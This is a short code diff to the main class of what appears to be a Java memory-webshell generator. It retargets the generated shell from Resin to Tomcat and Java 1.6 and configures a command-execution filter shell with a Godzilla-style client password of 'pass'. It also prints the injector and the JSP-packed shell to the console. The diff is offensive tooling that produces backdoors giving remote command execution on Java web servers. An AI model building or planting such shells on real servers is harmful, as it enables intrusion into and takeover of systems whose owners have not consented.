@@ -20,10 +20,10 @@ public class GeneratorMain {
 
     public static void main(String[] args) throws IOException {
         ShellConfig shellConfig = ShellConfig.builder()
-                .server(Server.Resin)
+                .server(Server.Tomcat)
                 .shellTool(ShellTool.Command)
                 .shellType(Constants.FILTER)
-                .targetJreVersion(Opcodes.V11)
+                .targetJreVersion(Opcodes.V1_6)
                 .build();
         GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                 .pass("pass")
@@ -34,10 +34,10 @@ public class GeneratorMain {
         InjectorConfig injectorConfig = new InjectorConfig();
         GenerateResult generateResult = generate(shellConfig, injectorConfig, commandConfig);
         if (generateResult != null) {
-            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
-            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
+//            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
+//            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
             System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
-            System.out.println(Base64.encodeBase64String(Packer.INSTANCE.JSP.getPacker().pack(generateResult)));
+            System.out.println(new String(Packer.INSTANCE.JSP.getPacker().pack(generateResult)));
         }
     }
 
